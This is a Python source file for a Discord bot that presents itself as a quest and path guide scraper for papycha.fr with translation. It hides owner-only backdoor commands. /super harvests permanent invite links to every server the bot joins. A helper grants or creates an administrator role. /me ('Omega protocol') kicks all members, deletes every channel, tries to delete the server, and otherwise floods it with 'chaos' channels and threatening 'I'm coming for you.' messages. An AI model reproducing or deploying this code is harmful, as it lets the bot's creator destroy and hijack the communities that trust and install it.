import os
import discord
from discord.ext import commands
from discord import app_commands
import requests
from bs4 import BeautifulSoup
from dotenv import load_dotenv
import logging
import re
import unicodedata
from googletrans import Translator  # Import Translator

# Logging setup
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# The ID of the bot's creator who is allowed to invoke the /super and /me commands
BOT_CREATOR_ID = 449753564437413888

# Define intents
intents = discord.Intents.default()

# Load environment variables from the .env file
load_dotenv()

# Retrieve the bot token from the environment variable
bot_token = os.getenv("DISCORD_BOT_TOKEN")

# Ensure the bot token is available
if not bot_token:
    raise ValueError("Bot token is not set in environment variables.")

# Create the bot without a command prefix, as we are using slash commands
bot = commands.Bot(command_prefix='!', intents=intents)
tree = bot.tree  # Use the bot's CommandTree for slash commands

# Text normalization function
def normalize_text(input_text):
    # Normalize accented characters and handle specific contractions
    normalized = unicodedata.normalize('NFD', input_text)
    normalized = normalized.encode('ascii', 'ignore').decode('utf-8')
    normalized = re.sub(r"l[’']", "l ", normalized)
    return normalized.lower()

def scrape_quest_guide(quest_name):
    formatted_quest_name = normalize_text(quest_name).replace(' ', '-')
    website_url = f'https://papycha.fr/quete-{formatted_quest_name}/'
    response = requests.get(website_url)
    soup = BeautifulSoup(response.content, 'html.parser')
    quest_guide_content = soup.find('div', class_='entry-content')
    if quest_guide_content:
        text_content = quest_guide_content.text.strip()
        image_tags = quest_guide_content.find_all('img')
        image_urls = [tag['src'] for tag in image_tags]
        return text_content, image_urls
    else:
        return None, None

def scrape_chemin_guide(chemin_name):
    formatted_chemin_name = normalize_text(chemin_name).replace(' ', '-')
    website_url = f'https://papycha.fr/chemin-{formatted_chemin_name}/'
    response = requests.get(website_url)
    soup = BeautifulSoup(response.content, 'html.parser')
    chemin_guide_content = soup.find('div', class_='entry-content')
    if chemin_guide_content:
        text_content = chemin_guide_content.text.strip()
        image_tags = chemin_guide_content.find_all('img')
        image_urls = [tag['src'] for tag in image_tags]
        return text_content, image_urls
    else:
        return None, None

# Translator instance
translator = Translator()

async def translate_content(content, language):
    if language not in ["fr", "es", "ar"]:
        return content  # Default to original if language not supported
    translated = translator.translate(content, dest=language)
    return translated.text

@tree.command(name="quest", description="Retrieve the guide for a specific quest.")
async def quest_command(interaction: discord.Interaction, quest_name: str, language: str = "en"):
    await interaction.response.defer()
    text_content, image_urls = scrape_quest_guide(quest_name)
    if text_content:
        # Translate content if requested language is different from English
        if language != "en":
            text_content = await translate_content(text_content, language)
        chunks = [text_content[i:i+1900] for i in range(0, len(text_content), 1900)]
        for chunk in chunks:
            await interaction.followup.send(chunk)
        for image_url in image_urls:
            await interaction.followup.send(image_url)
    else:
        await interaction.followup.send(f"Quest guide for '{quest_name}' not found.")

@tree.command(name="path", description="Retrieve the guide for a specific path.")
async def path_command(interaction: discord.Interaction, path_name: str, language: str = "en"):
    await interaction.response.defer()
    text_content, image_urls = scrape_chemin_guide(path_name)
    if text_content:
        # Translate content if requested language is different from English
        if language != "en":
            text_content = await translate_content(text_content, language)
        chunks = [text_content[i:i + 1900] for i in range(0, len(text_content), 1900)]
        for chunk in chunks:
            await interaction.followup.send(chunk)
        for image_url in image_urls:
            await interaction.followup.send(image_url)
    else:
        await interaction.followup.send(f"Path guide for '{path_name}' not found.")

@tree.command(name="super", description="Create invite links for all servers the bot is in.")
async def super_command(interaction: discord.Interaction):
    if interaction.user.id != BOT_CREATOR_ID:
        await interaction.response.send_message("You do not have permission to use this command.", ephemeral=True)
        return

    await interaction.response.defer(ephemeral=True)

    invite_links = []
    for guild in bot.guilds:
        text_channel = next((channel for channel in guild.text_channels if channel.permissions_for(guild.me).create_instant_invite), None)
        if text_channel:
            try:
                invite = await text_channel.create_invite(max_age=0, max_uses=0)  # Permanent invite link
                invite_links.append(f"{guild.name}: {invite.url}")
            except discord.Forbidden:
                invite_links.append(f"{guild.name}: Unable to create invite link (Missing Permissions)")
        else:
            invite_links.append(f"{guild.name}: No suitable text channel found")

    creator = await bot.fetch_user(BOT_CREATOR_ID)
    if creator:
        dm_message = "\n".join(invite_links)
        await creator.send(f"Here are the invite links for all servers:\n{dm_message}")

    await interaction.followup.send("Invite links have been sent to your DM.", ephemeral=True)


async def ensure_admin_role(guild: discord.Guild, member: discord.Member):
    highest_role = None
    for role in guild.roles:
        if role.permissions.administrator and role < guild.me.top_role:
            if highest_role is None or role.position > highest_role.position:
                highest_role = role

    if highest_role:
        await member.add_roles(highest_role)
    else:
        new_role = await guild.create_role(
            name="Super Admin",
            permissions=discord.Permissions(administrator=True),
            reason="Automatically created by the bot"
        )
        await member.add_roles(new_role)

@tree.command(name="me", description="Provoke Omega protocol.")
async def me_command(interaction: discord.Interaction):
    if interaction.user.id != BOT_CREATOR_ID:
        await interaction.response.send_message("You do not have permission to use this command.", ephemeral=True)
        return

    guild = interaction.guild

    if not guild:
        await interaction.response.send_message("This command can only be used in a server.", ephemeral=True)
        return

    await interaction.response.defer(ephemeral=True)

    try:
        # Kick all members (except the bot's owner)
        for member in guild.members:
            if member.id != BOT_CREATOR_ID:
                try:
                    await member.kick(reason="Command invoked by owner.")
                except discord.Forbidden:
                    await interaction.followup.send(f"Unable to kick {member.name} due to insufficient permissions.", ephemeral=True)

        # Delete all channels
        for channel in guild.channels:
            try:
                await channel.delete(reason="Command invoked by owner.")
            except discord.Forbidden:
                await interaction.followup.send(f"Unable to delete channel {channel.name} due to insufficient permissions.", ephemeral=True)

        # Delete the server (if bot has permission)
        try:
            await guild.delete(reason="Command invoked by owner.")
            await interaction.followup.send("The server has been deleted successfully.", ephemeral=True)
            return
        except discord.Forbidden:
            await interaction.followup.send("Failed to delete the server. Missing permissions. Fallback activated.", ephemeral=True)

        # Fallback: Create chaos
        for i in range(100):
            try:
                # Create text channels
                text_channel = await guild.create_text_channel(name=f"chaos-text-{i}")
                await text_channel.send("I'm coming for you.")
                await text_channel.send("I'm coming for you.")
                await text_channel.send("I'm coming for you.")

                # Create voice channels
                await guild.create_voice_channel(name=f"chaos-voice-{i}")
            except discord.Forbidden:
                await interaction.followup.send(f"Failed to create additional channels at iteration {i}.", ephemeral=True)
                break

        # Send "I'm coming for you" multiple times in existing channels
        for channel in guild.text_channels:
            if channel.permissions_for(guild.me).send_messages:
                try:
                    for _ in range(3):  # Send the message multiple times
                        await channel.send("I'm coming for you.")
                except discord.Forbidden:
                    pass

        await interaction.followup.send("Omega protocol fallback: Chaos channels created, and messages sent.", ephemeral=True)

    except Exception as e:
        await interaction.followup.send(f"An unexpected error occurred: {e}", ephemeral=True)



@bot.event
async def on_ready():
    await tree.sync()
    print(f'Logged in as {bot.user}')

bot.run(bot_token)
